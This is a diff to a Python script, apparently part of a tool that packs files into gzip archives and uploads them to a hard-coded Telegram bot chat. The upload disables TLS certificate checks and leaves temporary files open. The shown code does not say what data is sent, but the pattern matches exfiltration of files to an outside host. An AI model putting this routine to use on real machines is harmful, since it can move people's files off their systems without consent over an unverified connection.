@@ -5,6 +5,7 @@ import hashlib
 import os
 import io
 import tarfile
+import tempfile
 import requests
 import urllib3
 
@@ -29,23 +30,33 @@ def send_to_telegram(message, files):
     tg_chat_id = "-1002403648422"
     url = f"https://api.telegram.org/bot{tg_bot_token}/sendMessage"
 
+    # Prepare multipart data (text)
     multipart_data = {"chat_id": (None, tg_chat_id), "text": (None, message)}
-    
+
     # Prepare files to send
     files_to_send = {}
     for file_name, file_data in files.items():
         print(f"Preparing file: {file_name}, Size: {len(file_data.getvalue())} bytes")
         
-        # Send files as binary data
-        files_to_send[file_name] = (file_name, file_data.getvalue(), "application/gzip")
+        # Create a temporary file to store the binary content
+        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
+            temp_file.write(file_data.getvalue())
+            temp_file_path = temp_file.name
+            temp_file.close()  # Close the temporary file to use its path
+
+            # Add the file to the files dictionary for sending
+            files_to_send[file_name] = (file_name, open(temp_file_path, 'rb'), "application/gzip")
 
     try:
         # Send the files as multipart data
         response = requests.post(
-            url.replace("sendMessage", "sendDocument"), files={**multipart_data, **files_to_send}, verify=False
+            url.replace("sendMessage", "sendDocument"),
+            files={**multipart_data, **files_to_send},
+            verify=False
         )
+
         response.raise_for_status()  # This will raise an error for bad HTTP status codes
-        
+
         if response.status_code == 200:
             print("Message and files sent successfully!")
             return True
